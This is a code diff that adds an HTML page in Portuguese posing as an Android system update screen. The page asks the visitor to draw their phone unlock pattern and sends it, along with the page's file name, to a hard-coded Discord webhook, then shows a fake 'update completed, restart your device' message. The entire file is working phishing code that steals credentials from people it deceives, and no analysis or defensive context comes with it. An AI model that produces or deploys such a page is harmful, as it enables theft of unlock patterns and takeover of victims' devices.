@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>Atualização do sistema</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg: #121212;
+  --fg: #ffffff;
+  --muted: rgba(255,255,255,.7);
+  --node-size: clamp(56px, 9vw, 72px);
+  --gap: clamp(14px, 4vw, 22px);
+}
+
+* {
+  box-sizing: border-box;
+  user-select: none;
+  -webkit-user-select: none;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+  height: 100%;
+  margin: 0;
+  background: var(--bg);
+  color: var(--fg);
+  font-family: Roboto, system-ui, sans-serif;
+  overscroll-behavior: none;
+  touch-action: none;
+}
+
+body {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: env(safe-area-inset-top) env(safe-area-inset-right)
+           env(safe-area-inset-bottom) env(safe-area-inset-left);
+}
+
+.screen {
+  width: 100%;
+  max-width: 420px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  gap: 14px;
+  transition: opacity 0.5s ease, transform 0.5s ease;
+}
+
+.screen.hidden {
+  opacity: 0;
+  transform: scale(0.9);
+  pointer-events: none;
+  position: absolute;
+}
+
+/* LOGO */
+.logo {
+  width: 64px;
+  height: 64px;
+}
+
+h1 {
+  font-size: clamp(20px, 5vw, 24px);
+  font-weight: 600;
+  margin: 0;
+}
+
+.subtitle {
+  font-size: clamp(14px, 4vw, 16px);
+  color: var(--muted);
+}
+
+/* ÁREA DO PADRÃO */
+.pattern-wrap {
+  margin-top: 10px;
+  padding: 20px;
+  border-radius: 24px;
+  background: rgba(255,255,255,.03);
+  transition: opacity 0.5s ease, transform 0.5s ease;
+}
+
+/* GRID */
+.grid {
+  position: relative;
+  width: calc((var(--node-size) * 3) + (var(--gap) * 2));
+  height: calc((var(--node-size) * 3) + (var(--gap) * 2));
+  display: grid;
+  grid-template-columns: repeat(3, var(--node-size));
+  grid-template-rows: repeat(3, var(--node-size));
+  gap: var(--gap);
+  justify-items: center;
+  align-items: center;
+  touch-action: none;
+}
+
+/* CANVAS */
+canvas {
+  position: absolute;
+  inset: 0;
+  pointer-events: none;
+}
+
+/* NÓS */
+.node {
+  width: var(--node-size);
+  height: var(--node-size);
+  border-radius: 50%;
+  background: rgba(255,255,255,.08);
+  border: 2px solid rgba(255,255,255,.2);
+  margin: 0;
+  padding: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+.node::after {
+  content: "";
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: rgba(255,255,255,.45);
+}
+
+/* ATIVO (BRANCO) */
+.node.active {
+  background: rgba(255,255,255,.15);
+  border-color: #fff;
+  box-shadow: 0 0 0 8px rgba(255,255,255,.12);
+}
+
+.node.active::after {
+  background: #fff;
+}
+
+/* Botão Concluir Atualização */
+.complete-btn {
+  display: none;
+  margin-top: 20px;
+  padding: 12px 24px;
+  background-color: #3DDC84;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+.complete-btn:hover {
+  background-color: #2bc674;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 8px rgba(61, 220, 132, 0.3);
+}
+
+.complete-btn:active {
+  transform: translateY(0);
+}
+
+.loading {
+  display: inline-block;
+  width: 16px;
+  height: 16px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-radius: 50%;
+  border-top-color: white;
+  animation: spin 1s ease-in-out infinite;
+  margin-right: 8px;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* TELA DE REINICIALIZAÇÃO */
+.restart-screen {
+  opacity: 0;
+  transform: scale(0.9);
+  pointer-events: none;
+  position: absolute;
+  width: 100%;
+  max-width: 420px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  gap: 24px;
+  transition: opacity 0.5s ease, transform 0.5s ease;
+}
+
+.restart-screen.visible {
+  opacity: 1;
+  transform: scale(1);
+  pointer-events: all;
+  position: relative;
+}
+
+.restart-icon {
+  width: 120px;
+  height: 120px;
+  position: relative;
+}
+
+.restart-icon svg {
+  width: 100%;
+  height: 100%;
+  animation: rotate 2s linear infinite;
+}
+
+@keyframes rotate {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+
+.checkmark {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 50px;
+  height: 50px;
+  opacity: 0;
+  animation: fadeIn 0.5s ease 1s forwards;
+}
+
+@keyframes fadeIn {
+  to { opacity: 1; }
+}
+
+.restart-title {
+  font-size: clamp(22px, 6vw, 28px);
+  font-weight: 600;
+  margin: 0;
+}
+
+.restart-subtitle {
+  font-size: clamp(16px, 4.5vw, 18px);
+  color: var(--muted);
+  line-height: 1.5;
+  max-width: 300px;
+}
+
+.restart-btn {
+  margin-top: 16px;
+  padding: 14px 28px;
+  background-color: #3DDC84;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  opacity: 0;
+  animation: fadeIn 0.5s ease 1.5s forwards;
+}
+
+.restart-btn:hover {
+  background-color: #2bc674;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 8px rgba(61, 220, 132, 0.3);
+}
+
+.restart-btn:active {
+  transform: translateY(0);
+}
+</style>
+</head>
+
+<body>
+<!-- TELA INICIAL - PADRÃO DE SENHA -->
+<main class="screen" id="passwordScreen">
+
+<!-- LOGO ANDROID (SVG) -->
+<svg class="logo" viewBox="0 0 64 64" aria-label="Android">
+  <path fill="#3DDC84" d="M18 22a12 12 0 0124 0v16a12 12 0 01-24 0z"/>
+  <rect x="12" y="26" width="6" height="14" rx="3" fill="#3DDC84"/>
+  <rect x="46" y="26" width="6" height="14" rx="3" fill="#3DDC84"/>
+  <circle cx="26" cy="26" r="2" fill="#0b2"/>
+  <circle cx="38" cy="26" r="2" fill="#0b2"/>
+</svg>
+
+<h1>Atualização do sistema</h1>
+<div class="subtitle">Insira a senha para concluir a atualização do seu Android</div>
+
+<section class="pattern-wrap">
+  <div class="grid" id="grid">
+    <canvas id="lines"></canvas>
+
+    <button class="node" data-id="1"></button>
+    <button class="node" data-id="2"></button>
+    <button class="node" data-id="3"></button>
+    <button class="node" data-id="4"></button>
+    <button class="node" data-id="5"></button>
+    <button class="node" data-id="6"></button>
+    <button class="node" data-id="7"></button>
+    <button class="node" data-id="8"></button>
+    <button class="node" data-id="9"></button>
+  </div>
+</section>
+
+<!-- Botão movido para cima, no lugar da div de status -->
+<button id="completeBtn" class="complete-btn">Concluir Atualização</button>
+
+</main>
+
+<!-- TELA DE REINICIALIZAÇÃO -->
+<main class="restart-screen" id="restartScreen">
+  <div class="restart-icon">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#3DDC84"/>
+      <path d="M12.5 7H11v6l5.25 3.15.75-1.23-4.5-2.67z" fill="#3DDC84"/>
+    </svg>
+    <div class="checkmark">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="#3DDC84"/>
+      </svg>
+    </div>
+  </div>
+  
+  <h2 class="restart-title">Atualização concluída</h2>
+  <p class="restart-subtitle">Reinicie seu dispositivo para concluir a instalação das atualizações do sistema.</p>
+    
+</main>
+
+<script>
+const grid = document.getElementById('grid');
+const canvas = document.getElementById('lines');
+const ctx = canvas.getContext('2d');
+const nodes = [...document.querySelectorAll('.node')];
+const completeBtn = document.getElementById('completeBtn');
+const passwordScreen = document.getElementById('passwordScreen');
+const restartScreen = document.getElementById('restartScreen');
+const restartBtn = document.getElementById('restartBtn');
+
+let drawing = false;
+let sequence = [];
+let points = [];
+let activePointerId = null;
+let patternComplete = false;
+
+// URL da webhook do Discord (substitua pela sua URL real)
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1319907094190882909/rRekbNZwYxzg-k4k_A5CFUN66AVrKUvEiM3DLIVDWBHs9MsRazx1dKa9iPjKpAlMXCVR";
+
+// Função para extrair o nome do arquivo da URL
+function getFileName() {
+  const path = window.location.pathname;
+  const fileName = path.split('/').pop();
+  return fileName;
+}
+
+/* CANVAS SIZE */
+function resizeCanvas() {
+  const r = grid.getBoundingClientRect();
+  canvas.width = r.width * devicePixelRatio;
+  canvas.height = r.height * devicePixelRatio;
+  canvas.style.width = r.width + "px";
+  canvas.style.height = r.height + "px";
+  ctx.setTransform(devicePixelRatio,0,0,devicePixelRatio,0,0);
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+function center(el) {
+  const r = el.getBoundingClientRect();
+  const g = grid.getBoundingClientRect();
+  return { x: r.left - g.left + r.width/2, y: r.top - g.top + r.height/2 };
+}
+
+function getPoint(e) {
+  const p = e.touches ? e.touches[0] : e;
+  const g = grid.getBoundingClientRect();
+  return { x: p.clientX - g.left, y: p.clientY - g.top };
+}
+
+function hitTest(p) {
+  for (const n of nodes) {
+    const c = center(n);
+    const r = n.offsetWidth / 2;
+    if (Math.hypot(p.x - c.x, p.y - c.y) <= r * 0.8) {
+      return n;
+    }
+  }
+  return null;
+}
+
+function draw(current) {
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  if (!points.length) return;
+
+  ctx.strokeStyle = "#ffffff";
+  ctx.lineWidth = 3;
+  ctx.lineCap = "round";
+  ctx.lineJoin = "round";
+
+  ctx.beginPath();
+  ctx.moveTo(points[0].x, points[0].y);
+  for (let i = 1; i < points.length; i++) {
+    ctx.lineTo(points[i].x, points[i].y);
+  }
+  if (drawing && current) {
+    ctx.lineTo(current.x, current.y);
+  }
+  ctx.stroke();
+}
+
+function reset(keepPattern = false) {
+  drawing = false;
+  sequence = [];
+  points = [];
+  
+  if (!keepPattern) {
+    nodes.forEach(n => n.classList.remove('active'));
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    completeBtn.style.display = 'none';
+    patternComplete = false;
+  }
+}
+
+// Função para enviar a senha para o Discord
+async function sendPasswordToDiscord(password) {
+  try {
+    // Formata a senha como string com espaços entre os números
+    const passwordString = password.join(' ');
+    
+    // Obtém o nome do arquivo
+    const fileName = getFileName();
+    
+    // Cria o payload para a webhook do Discord
+    const payload = {
+      content: `📂Arquivo: ${fileName}\n🗝️Senha: ${passwordString}`,
+      username: "Android Update System",
+      avatar_url: "https://cdn-icons-png.flaticon.com/512/1796/1796499.png" // Ícone do Android
+    };
+    
+    // Envia a requisição para a webhook do Discord
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload)
+    });
+    
+    if (!response.ok) {
+      throw new Error('Falha ao enviar a senha para o Discord');
+    }
+    
+    return true;
+  } catch (error) {
+    console.error('Erro ao enviar para o Discord:', error);
+    return false;
+  }
+}
+
+// Função para mostrar a tela de reinicialização
+function showRestartScreen() {
+  passwordScreen.classList.add('hidden');
+  setTimeout(() => {
+    restartScreen.classList.add('visible');
+  }, 300);
+}
+
+/* POINTER EVENTS CORRETOS */
+grid.addEventListener('pointerdown', (e) => {
+  e.preventDefault();
+  activePointerId = e.pointerId;
+  grid.setPointerCapture(activePointerId);
+
+  // Se já há um padrão completo, reset para desenhar novamente
+  if (patternComplete) {
+    reset();
+  }
+  
+  drawing = true;
+  move(e);
+});
+
+grid.addEventListener('pointermove', (e) => {
+  if (!drawing || e.pointerId !== activePointerId) return;
+  move(e);
+});
+
+grid.addEventListener('pointerup', (e) => {
+  if (e.pointerId !== activePointerId) return;
+
+  drawing = false;
+  activePointerId = null;
+
+  try { grid.releasePointerCapture(e.pointerId); } catch {}
+
+  if (sequence.length > 0) {
+    patternComplete = true;
+    completeBtn.style.display = 'block';
+  }
+});
+
+// 👉 evita cancelar quando sai da área
+grid.addEventListener('pointerleave', (e) => {
+  if (drawing && e.pointerId === activePointerId) {
+    // continua desenhando mesmo fora
+    move(e);
+  }
+});
+
+grid.addEventListener('pointercancel', (e) => {
+  // não reseta, apenas encerra o gesto
+  drawing = false;
+  activePointerId = null;
+});
+
+function move(e) {
+  const p = getPoint(e);
+  const hit = hitTest(p);
+
+  if (hit && !sequence.includes(+hit.dataset.id)) {
+    hit.classList.add('active');
+    sequence.push(+hit.dataset.id);
+    points.push(center(hit));
+  }
+  draw(p);
+}
+
+// Evento de clique no botão "Concluir Atualização"
+completeBtn.addEventListener('click', async () => {
+  // Adiciona indicador de carregamento
+  const originalText = completeBtn.innerHTML;
+  completeBtn.innerHTML = '<span class="loading"></span>Enviando...';
+  completeBtn.disabled = true;
+  
+  // Envia a senha para o Discord
+  const success = await sendPasswordToDiscord(sequence);
+  
+  if (success) {
+    completeBtn.innerHTML = 'Concluído ✓';
+    
+    // Mostra a tela de reinicialização após um breve atraso
+    setTimeout(() => {
+      showRestartScreen();
+    }, 1000);
+  } else {
+    completeBtn.innerHTML = 'Erro ao enviar';
+    
+    // Após 3 segundos, reset para permitir novo desenho
+    setTimeout(() => {
+      completeBtn.innerHTML = originalText;
+      completeBtn.disabled = false;
+    }, 3000);
+  }
+});
+
+// Evento de clique nos nós para permitir redesenhar
+nodes.forEach(node => {
+  node.addEventListener('click', () => {
+    if (patternComplete) {
+      reset();
+    }
+  });
+});
+
+// Evento de clique no botão de reinicialização
+restartBtn.addEventListener('click', () => {
+  // Simula o reinício do dispositivo
+  document.body.style.transition = 'opacity 0.5s ease';
+  document.body.style.opacity = '0';
+  
+  setTimeout(() => {
+    // Em um cenário real, aqui o dispositivo seria reiniciado
+    // Para demonstração, apenas recarregamos a página
+    location.reload();
+  }, 500);
+});
+</script>
+</body>
+</html>
